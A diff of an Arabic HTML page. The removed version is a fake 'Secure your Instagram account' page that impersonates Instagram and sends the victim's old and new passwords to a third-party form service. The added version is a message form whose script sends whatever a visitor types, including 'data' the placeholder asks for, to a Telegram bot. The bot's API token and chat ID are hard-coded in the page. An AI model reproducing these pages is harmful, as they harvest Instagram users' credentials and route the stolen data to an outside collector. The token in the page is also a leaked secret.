@@ -1,172 +1,115 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تأمين حساب إنستغرام</title>
-  
-  <!-- خط Cairo الحديث -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      font-family: 'Cairo', sans-serif;
-      /* خلفية بتدرج مستوحى من ألوان إنستغرام الهادئة */
-      background: linear-gradient(135deg, #fdf4f7 0%, #e8e3f5 100%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-
-    .form-container {
-      background: #ffffff;
-      padding: 35px 30px;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
-      width: 100%;
-      max-width: 420px;
-    }
-
-    /* عنوان الصفحة مع علامة التوثيق */
-    .title-container {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 8px;
-    }
-
-    h2 {
-      color: #1e293b;
-      font-weight: 700;
-      font-size: 22px;
-    }
-
-    /* أيقونة علامة التوثيق الزرقاء */
-    .verified-icon {
-      width: 22px;
-      height: 22px;
-      fill: #0095f6;
-    }
-
-    p.subtitle {
-      text-align: center;
-      color: #64748b;
-      font-size: 13px;
-      margin-bottom: 25px;
-    }
-
-    .form-group {
-      margin-bottom: 20px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 8px;
-      color: #334155;
-      font-size: 14px;
-      font-weight: 600;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px 16px;
-      border: 1.5px solid #cbd5e1;
-      border-radius: 8px;
-      font-size: 14px;
-      font-family: inherit;
-      color: #0f172a;
-      background-color: #f8fafc;
-      transition: all 0.25s ease;
-      direction: ltr; /* لجعل كتابة كلمة السر أسهل */
-      text-align: right;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #e1306c; /* لون تركيز مستوحى من إنستغرام */
-      background-color: #ffffff;
-      box-shadow: 0 0 0 4px rgba(225, 48, 108, 0.1);
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-      color: #ffffff;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 600;
-      font-family: inherit;
-      cursor: pointer;
-      transition: opacity 0.25s ease, transform 0.1s ease;
-    }
-
-    button:hover {
-      opacity: 0.95;
-    }
-
-    button:active {
-      transform: scale(0.98);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال رسالة</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+        textarea {
+            width: 100%;
+            height: 120px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            resize: none;
+            box-sizing: border-box;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+    </style>
 </head>
-
 <body>
 
-  <div class="form-container">
+<div class="container">
+    <h2>أرسل رسالتك</h2>
+    <textarea id="userMessage" placeholder="اكتب رسالتك أو بياناتك هنا..."></textarea>
+    <button onclick="sendToTelegram()">إرسال إلى تلغرام</button>
+    <div id="status"></div>
+</div>
+
+<script>
+function sendToTelegram() {
+    // بياناتك الخاصة المسجلة سابقاً
+    const token = "8765312624:AAF5cD-VCsNGRVbgH2eh1g8NdqmH49Bvi3M";
+    const chatId = "5775368729";
     
-    <!-- العنوان مع علامة التوثيق -->
-    <div class="title-container">
-      <h2>تأمين حساب إنستغرام</h2>
-      <svg class="verified-icon" viewBox="0 0 24 24">
-        <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7l-3.5-3.5 1.4-1.4 2.1 2.1 6-6 1.4 1.4-7.4 7.4z"/>
-      </svg>
-    </div>
-    
-    <p class="subtitle">قم بتحديث كلمة السر لتأمين حسابك بشكل أفضل</p>
+    const messageInput = document.getElementById("userMessage").value;
+    const statusDiv = document.getElementById("status");
 
-    <form action="https://formspree.io/f/xvkpvdvv" method="POST">
+    if (messageInput.trim() === "") {
+        statusDiv.style.color = "red";
+        statusDiv.innerText = "⚠️ يرجى كتابة النص أولاً!";
+        return;
+    }
 
-      <!-- الخانة الأولى: كلمة السر القديمة -->
-      <div class="form-group">
-        <label for="old-password">كلمة السر القديمة:</label>
-        <input
-          type="password"
-          id="old-password"
-          name="old_password"
-          placeholder="أدخل كلمة السر القديمة"
-          required
-        >
-      </div>
+    statusDiv.style.color = "#555";
+    statusDiv.innerText = "جاري الإرسال...";
 
-      <!-- الخانة الثانية: كلمة السر الجديدة -->
-      <div class="form-group">
-        <label for="new-password">كلمة السر الجديدة:</label>
-        <input
-          type="password"
-          id="new-password"
-          name="new_password"
-          placeholder="أدخل كلمة السر الجديدة"
-          required
-        >
-      </div>
+    // إعداد نص الرسالة
+    const text = encodeURIComponent("📩 رسالة جديدة من الموقع:\n\n" + messageInput);
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
 
-      <button type="submit">تحديث كلمة السر</button>
-
-    </form>
-  </div>
+    // إرسال الطلب إلى API تلغرام
+    fetch(url)
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            statusDiv.style.color = "green";
+            statusDiv.innerText = "✅ تم الإرسال بنجاح إلى التلغرام!";
+            document.getElementById("userMessage").value = ""; // تفريغ الخانة
+        } else {
+            statusDiv.style.color = "red";
+            statusDiv.innerText = "❌ حدث خطأ أثناء الإرسال.";
+        }
+    })
+    .catch(error => {
+        statusDiv.style.color = "red";
+        statusDiv.innerText = "❌ تعذر الاتصال بالسيرفر.";
+        console.error("Error:", error);
+    });
+}
+</script>
 
 </body>
 </html>
